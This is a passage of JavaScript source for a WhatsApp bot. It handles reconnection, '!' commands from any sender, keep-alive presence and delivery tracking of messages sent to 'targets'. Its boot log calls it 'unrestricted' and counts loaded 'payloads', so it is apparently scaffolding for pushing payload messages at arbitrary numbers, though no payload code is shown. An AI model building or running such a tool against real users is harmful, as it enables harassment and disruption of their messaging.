          scheduleReconnect(phoneNumber)
        } else {
          console.log('[CONN] loggedOut — stopping')
          if (socket) socket.emit('logged-out', 'Logged out')
          reconnectAttempts.delete(sid)
        }
      } else {
        scheduleReconnect(phoneNumber)
      }
    }

    if (connection === 'open') {
      isConnected = true
      reconnectAttempts.delete(sid)
      isConnecting.delete(sid)
      lastConnectedAt.set(sid, Date.now())
      consecutive428.delete(sid)
      if (reconnectTimers.has(sid)) {
        clearTimeout(reconnectTimers.get(sid))
        reconnectTimers.delete(sid)
      }
      // Register our own LID -> phone mapping so LID senders resolve back to us
      if (conn.user?.lid) {
        const lidNorm = normalizeJid(conn.user.lid)
        lidToPhone.set(lidNorm, normalizeJid(conn.user.id))
        lidToPhone.set(normalizeJid(conn.user.id), lidNorm)
      }
      if (socket) socket.emit('connected', 'Connected')
      console.log(`[CONN] ${sid} ready — listening for commands (${conn.user?.id || 'no jid yet'})`)
    }
  })

  conn.ev.on('creds.update', saveCreds)
  conn.ev.on('messages.upsert', onMessages)
  conn.ev.on('messages.update', onMessagesUpdate)
}

// ---------------------------------------------------------------------------
// Incoming messages (cypher-md: normalizeMessageContent + dedup + notify gate)
// ---------------------------------------------------------------------------
async function onMessages({ messages, type }) {
  const msg = messages[0]
  if (!msg?.key || !msg?.message) return
  const _s = sock.state

  const normalizedContent = normalizeMessageContent(msg.message)
  const body = normalizedContent?.conversation || normalizedContent?.extendedTextMessage?.text || ''

  // Auto-detection: log-only, never blocks or replies.
  if (scoreMessage && !msg.key.fromMe) {
    try {
      const verdict = scoreMessage(msg.message)
      const out = typeof verdict === 'object' ? JSON.stringify(verdict) : String(verdict)
      console.log(`[detect] ${msg.key?.remoteJid || '?'} -> score ${out}`)
    } catch (err) {
      console.warn(`[detect] scoreMessage threw: ${err.message}`)
    }
  }

  if (type !== 'notify') return

  const from = msg.key.remoteJid
  const isGroup = from.endsWith('@g.us')
  const sender = isGroup ? (msg.key.participant || msg.participant || from) : from

  // Command fast path (any sender, no whitelist)
  if (body.startsWith('!')) {
    const args = body.slice(1).trim().split(/\s+/).filter((a) => a.length)
    const rawCmd = args.shift().toLowerCase()
    const cmdName = aliasMap.get(rawCmd)
    if (cmdName) {
      await executeCommand(sock, from, cmdName, args, msg, sender)
      return
    }
  }

  // Dedup for any non-command processing
  if (_s.processedMessages.has(msg.key.id)) return
  _s.processedMessages.add(msg.key.id)
}

// ---------------------------------------------------------------------------
// Session + boot — startBot() auto-starts the legacy flat auth_info/ session
// only when run directly. When imported by server.js, per-number sessions are
// started explicitly via startBot(phoneNumber).
// ---------------------------------------------------------------------------
if (import.meta.main) {
  startBot().catch((err) => {
    console.error('[BOT] start failed:', err.message)
  })
}

// ---------------------------------------------------------------------------
// Keep-alive + boot (cypher-md style presence)
// ---------------------------------------------------------------------------
setInterval(async () => {
  try {
    if (sock) await sock.sendPresenceUpdate('available')
  } catch {
    /* socket closing — ignore */
  }
}, 25000)

// Periodic delivery-status dump: every 30s, report any tracked messages that
// are still not in a terminal state (DELIVERED/READ/FAILED), so you can see
// what the server accepted but the target never confirmed.
setInterval(() => {
  if (!sentTracker.size) return
  console.log(`[SEND-STATUS] ${sentTracker.size} message(s) still awaiting delivery confirm:`)
  for (const [id, e] of sentTracker) {
    console.log(`  - ${e.type} "${e.name}" -> ${e.target} [${e.statusLabel}] msgId=${id}`)
  }
}, 30000)

if (import.meta.main) {
  console.log('[bot] unrestricted — any sender can command, any target accepted.')
  console.log(`[bot] loaded ${Object.keys(payloads).length} payload(s), ${Object.keys(routines).length} routine(s).`)
  console.log('[bot] ready. Send !ping from any number to verify.')
}

export { startBot, connections, sessions, startTime, isConnecting, sentTracker, reportSentStatus }
